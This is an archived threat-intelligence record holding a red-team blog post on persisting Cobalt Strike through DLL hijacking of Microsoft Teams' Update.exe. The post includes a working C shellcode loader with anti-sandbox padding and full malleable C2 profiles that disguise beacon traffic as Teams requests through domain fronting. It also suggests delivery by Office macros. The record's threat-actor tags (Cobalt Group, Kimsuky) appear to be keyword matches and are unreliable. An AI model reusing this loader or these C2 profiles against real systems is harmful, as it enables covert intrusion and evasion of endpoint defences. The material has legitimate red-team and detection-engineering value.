{
    "id": "688d2a87-5254-44bd-bb6e-004cd62cc1f4",
    "created_at": "2023-01-12T15:01:05.45964Z",
    "updated_at": "2025-03-27T02:09:17.768913Z",
    "deleted_at": null,
    "sha1_hash": "7cb97a8df698cf8f3f3931902a89547eca47ca6c",
    "title": "2021-05-21 - Leveraging Microsoft Teams to persist and cover up Cobalt Strike traffic",
    "authors": "",
    "file_creation_date": "2022-05-27T19:02:11Z",
    "file_modification_date": "2022-05-27T19:02:11Z",
    "file_size": 1265752,
    "plain_text": "# Leveraging Microsoft Teams to persist and cover up Cobalt Strike traffic\n\n**[blackarrow.net/leveraging-microsoft-teams-to-persist-and-cover-up-cobalt-strike-traffic/](https://www.blackarrow.net/leveraging-microsoft-teams-to-persist-and-cover-up-cobalt-strike-traffic/)**\n\nMay 14, 2021\n\n14 - May - 2021 - Pablo Ambite\n\n## Introduction\n\n[During a recent Red Team scenario got local admin privileges on a workstation where an](https://www.tarlogic.com/red-team-services/)\n[EDR solution was identified. In this scenario, the next step to proceed with the engagement](https://www.tarlogic.com/threat-hunting/)\nwas to infect and persist on the compromised system, towards securing remote access. After\nexploring several options, a Microsoft Teams binary was identified as vulnerable to DLL\n**Hijacking.**\n\n\n-----\n\nThis article explains how to take advantage of this situation, making use of a Cobalt Strike\npayload embedded in a DLL. Finally, it details how to mimic legitimate Microsoft Teams traffic\nwhen communicating with the C&C using Cobalt Strike malleable C2 profiles.\n\n## Cobalt Strike persistence via DLL Hijacking\n\nIn order to ease up the process, the Red Team prepared a local environment, as close as\npossible to the original, to carry out the appropriate tests. After that, we used Process\nMonitor to identify processes trying to load non-existent DLLs. To do so, the following filters\nwere applied:\n\n**Column** **Relation** **Value** **Action**\n\nResult is NAME NOT FOUND Include\n\nPath ends with .dll Include\n\nThe process “Update.exe” (32bits) was spotted trying to load “CRYPTSP.dll” from the\nexecutable directory, failing to do so as this library is located in C:\\Windows\\SysWOW64.\nThis means that if a malicious DLL is placed in the same directory as the binary, the next\ntime “Update.exe” is started, the process will load this library first and make use of some\nexported functions.\n\nThis executable was an ideal candidate for the operation for different reasons:\n\n[It is an app update manager (Squirrel), present in multiple products installation (Teams,](https://github.com/Squirrel/Squirrel.Windows)\nSlack, Discord, Webex). In this case, it is part of Microsoft Teams, so it is signed by\n**Microsoft.**\nIt is executed every time the user opens the application.\nThe default installation sets a Run key in the Windows registry so that the application is\nautomatically launched every time the user logged in.\nIt is expected to make regular HTTP connections to the Internet, provigind a way to\ncamouflage the communications with a C&C.\n\n\n-----\n\nVulnerable binary detection\nAfter the target has been selected, the Red Team needs to implement a DLL that executes\nmalicious code (in this case, a Cobalt Strike payload). To accomplish this, the binary was\ndebugged placing breakpoints on all imported functions to check which of them was being\ninvoked first at “CRYPTSP.dll”.\n\nCryptAcquireContextW() breakpoint\nThis showed that `CryptAcquireContextW() is the first function being called by`\n“Update.exe”, so the Red Team developed a library that exports this function with a\ncustomized loader that recovers and executes the raw Cobalt Strike payload (shellcode)\n[from disk. A more transparent alternative would be to create a wrapper using DLL Proxying](https://itm4n.github.io/dll-proxying/)\ntechniques.\n\n\n-----\n\n```\nextern C {\n  void __declspec(dllexport) CryptAcquireContextW() {\n    char payload[PSIZE];\n    // Mutex management\n    HANDLE hMutex = CreateMutex(NULL, FALSE, TEXT(\"WindowsProc\"));\n    if (hMutex != NULL)\n      if (GetLastError() == ERROR_ALREADY_EXISTS)\n        ExitProcess(1);\n    // Garbage math operations\n    stale();\n    // Recover payload from file\n    if(decrypt_shellcode_from_file(payload, PAYLOAD_PATH) == SUCCESS){   \n      // Launch Teams.exe \n      execute_Teams();      \n      // Shellcode execution\n      HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,\nPAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);\n      LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS |\nFILE_MAP_EXECUTE, 0, 0, sizeof(payload));\n      memcpy((PVOID)lpMapAddress, payload, sizeof(payload));\n      __asm\n      {\n        mov eax, lpMapAddress\n        push eax;\n        ret\n      }\n    }\n    ReleaseMutex(hMutex);\n    CloseHandle(hMutex);\n  }\n}\n\n```\nIn this case, the exported function performs the following actions:\n\n1. Use of Mutex to halt execution if the payload is already executed.\n[2. stale() function call to evade some Machine Learning and Sandboxing checks.](https://www.tarlogic.com/blog/hindering-threat-hunting-a-tale-of-evasion-in-a-restricted-environment/)\n3. Shellcode retrieval and decryption from disk.\n4. Teams.exe execution to mimic Update.exe legitimate behaviour.\n5. Shellcode execution via CreateFileMapping + `MapViewOfFile +` `memcpy technique.`\n\n## Hiding communications with the C&C\n\nDue to the restrictions of the environment, in which Internet connectivity was only allowed to\nMicrosoft domains, Domain Fronting was used alongside customized Cobalt Strike profiles.\nThese settings provide a flexible way of building the HTTP requests and responses to\n\n\n-----\n\ncommunicate with the C&C.\n\nThe Red Team used this functionality to hide the agent’s communication, mimicking the\nHTTP traffic issued by Microsoft Teams. In this case, a staged payload was used, which is\ndivided into two parts: the stager and the stage. The first, smaller one, is responsible for\nobtaining the second C&C stage: a DLL containing all the agent’s logic (a beacon in Cobalt\nStrike terms) that is going to be reflectively loaded into memory. By using this type of\npayload, the communication flows with the C&C could be categorized into 3 types:\n\n1. Initial request to get the Cobalt DLL.\n2. Implant request to obtain tasks.\n3. Implant request to send tasks results.\n\n### Stager: obtaining the Cobalt Strike beacon\n\nThe http-stager section defines how to retrieve the beacon, where the stager request\nsimulates an image download, making use of Microsoft Teams’ own HTTP headers. The\nresponse appears to be a legitimate picture, but contains the beacon DLL. In order to\nachieve this, well-formed JPEG header and trailing bytes are used.\n\n\n-----\n\n```\nhttp stager {\n  set uri_x86 \"/v1/objects/0-neu-d10-ccab474e582c03325f9f07ba8a3aae8a/views/imgo\";\n  set uri_x64 \"/v1/objects/0-neu-d10-cdab424e592c03253f9f07ba8d9aae8a/views/imgo\";\n  client {\n    header \"Host\" \"<Endpoint Azure>\";\n    header \"x-mx-client-version\" \"27/1.0.0.2021020410\";\n    header \"Origin\" \"https://teams.microsoft\";\n    parameter \"v\" \"1\";\n  }\n  server {\n    header \"Server\" \"Microsoft-IIS/10.0\";\n    header \"strict-transport-security\" \"max-age=31536000; includeSubDomains\";\n    header \"X-Powered-By\" \"ARR/3.0\";\n    header \"X-Content-Type-Options\" \"nosniff\";\n    header \"x-ms-environment\" \"North Europe-prod-3,_cnsVMSS-6_26\";\n    header \"x-ms-latency\" \"40018.2038\";\n    header \"Timing-Allow-Origin\" \"https://teams.microsoft.com\";\n    header \"Access-Control-Allow-Origin\" \"https://teams.microsoft.com\";\n    header \"Access-Control-Allow-Credentials\" \"true\";\n    header \"Connection\" \"close\";\n    header \"Content-Type\" \"image/jpeg\";\n    output {\n      prepend\n\"\\xFF\\xD8\\xFF\\xE0\\x00\\x10\\x4A\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\\x48\\x00\\x48\\x00\\x00\\xFF\\\n      append\n\"\\xF9\\x7C\\xF3\\x4E\\x3F\\xEC\\x7F\\x82\\x8C\\xA4\\xB5\\x5B\\x3E\\x64\\x11\\xE7\\xEA\\x78\\x70\\xCD\\x6B\\\n      print;\n    }\n  }\n}\n\n```\nObtaining the payload\n\n\n-----\n\nThis way, tools like Wireshark will identify the content of the HTTP response as a JPEG\nimage.\n\nWireshark shows the reply as a JPEG file\n\n### Beacon: obtaining tasks\n\nThe following part of the profile is used to define the format of periodic requests in which the\nCobalt Strike agent asks for new tasks to be executed. These requests use the “events” GET\nparameter to send base64-encoded session information. As we saw before, the information\nencoded by the server is embedded into responses that appear to be legitimate.\n\n\n-----\n\n```\nhttp get {\n  set uri \"/Collector/2.0/settings/\";\n  client {\n    header \"Accept\" \"json\";\n    header \"Host\" \"<Endpoint Azure>\";\n    header \"Referer\" \"https://teams.microsoft.com/_\";\n    header \"x-ms-session-id\" \"f73c3186-057a-d996-3b63-b6e5de6ef20c\";\n    header \"x-ms-client-type\" \"desktop\";\n    header \"x-mx-client-version\" \"27/1.0.0.2021020410\";\n    header \"Accept-Encoding\" \"gzip, deflate, br\";\n    header \"Origin\" \"https://teams.microsoft.com\";\n    parameter \"qsp\" \"true\";\n    parameter \"client-id\" \"NO_AUTH\";\n    parameter \"sdk-version\" \"ACT-Web-JS-2.5.0&\";\n    metadata {\n      base64url;\n      parameter \"events\";\n    }\n  }\n  server {\n    header \"Content-Type\" \"application/json; charset=utf-8\";\n    header \"Server\" \"Microsoft-HTTPAPI/2.0\";\n    header \"X-Content-Type-Options\" \"nosniff\";\n    header \"x-ms-environment\" \"North Europe-prod-3,_cnsVMSS-6_26\";\n    header \"x-ms-latency\" \"40018.2038\";\n    header \"Access-Control-Allow-Origin\" \"https://teams.microsoft.com\";\n    header \"Access-Control-Allow-Credentials\" \"true\";\n    header \"Connection\" \"keep-alive\";\n    output {\n      netbios;\n      prepend \"{\\\"next\\\":\\\"https://westeurope-prod3.notifications.teams.microsoft.com/users/8:orgid:a17481c3-f754-4d06-97304eb0be94afc3/endpoints/\";\n      append \"/events/poll?cursor=1613554385&epfs=srt&sca=4}\";\n      print;\n    }\n  }\n}\n\n```\n\n-----\n\nSending commands\n\n### Beacon: sending results\n\nFinally, the http-post block specifies the format of the result requests sent from the agent to\nthe C&C. For this example, the output is inside of the Authentication HTTP header,\npretending to be a JWT authentication token.\n\n\n-----\n\n```\nhttp post {  \n  set verb \"GET\";\n  set uri \"/users/8:orgid:b1a28-a1c3-3d54-4eb01adb1/endpoints/events/poll\";\n  client {\n    header \"Accept\" \"json\";\n    header \"Host\" \"<Endpoint Azure>\";\n    header \"Referer\" \"https://teams.microsoft.com/_\";\n    header \"x-ms-query-params\"\n\"cursor=1613554385&epfs=srt&sca=5&activeTimeout=135\";\n    header \"x-ms-client-type\" \"desktop\";\n    header \"x-mx-client-version\" \"27/1.0.0.2021020410\";\n    header \"Accept-Encoding\" \"gzip, deflate, br\";\n    header \"Origin\" \"https://teams.microsoft\";\n    output {\n      base64;\n      prepend \"skypetoken=eyJhbGciOi\";\n      header \"Authentication\";  \n    }\n    id {\n      netbios;\n      prepend \"f73c3186-057a-d996-3b63-\";\n      header \"x-ms-session-id\";\n    }\n  }\n  server {\n    header \"Content-Type\" \"application/json; charset=utf-8\";\n    header \"Server\" \"Microsoft-HTTPAPI/2.0\";\n    header \"X-Content-Type-Options\" \"nosniff\";\n    header \"x-ms-environment\" \"North Europe-prod-3,_cnsVMSS-6_26\";\n    header \"x-ms-latency\" \"40018.2038\";\n    header \"Access-Control-Allow-Origin\" \"https://teams.microsoft.com\";\n    header \"Access-Control-Allow-Credentials\" \"true\";\n    header \"Connection\" \"keep-alive\";\n    output {\n      netbios;\n      prepend \"{\\\"next\\\":\\\"https://westeurope-prod3.notifications.teams.microsoft.com/users/8:orgid:a17481c3-f754-4d06-97304eb0be94afc3/endpoints/\";\n      append \"/events/poll?cursor=1613554385&epfs=srt&sca=4}\";\n      print;\n    }\n  }\n}\n\n```\n\n-----\n\nSending results\n\n## Conclusion\n\nThis article shows how an attacker could take advantage of DLL Hijacking vulnerabilities in\nservices to execute malicious code through signed binaries, mimicking the traffic of the\ncorresponding legitimate application to minimize the chances of being detected. It should be\nnoted that this technique can also be useful in social engineering exercises, in which\ndeploying the malicious DLL through Microsoft Office macros in any application directory that\nuses this app update manager would be sufficient, without needing to directly inject or\nexecute any payload.\n\nhttps://www.youtube.com/watch?v=1F6-j6dQtU0\n\n### Leave a comment\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-21 - Leveraging Microsoft Teams to persist and cover up Cobalt Strike traffic.pdf"
    ],
    "report_names": [
        "2021-05-21 - Leveraging Microsoft Teams to persist and cover up Cobalt Strike traffic.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535665,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653678131,
    "ts_modification_date": 1653678131,
    "files": {
        "pdf": "https://archive.orkl.eu/7cb97a8df698cf8f3f3931902a89547eca47ca6c.pdf",
        "text": "https://archive.orkl.eu/7cb97a8df698cf8f3f3931902a89547eca47ca6c.txt",
        "img": "https://archive.orkl.eu/7cb97a8df698cf8f3f3931902a89547eca47ca6c.jpg"
    }
}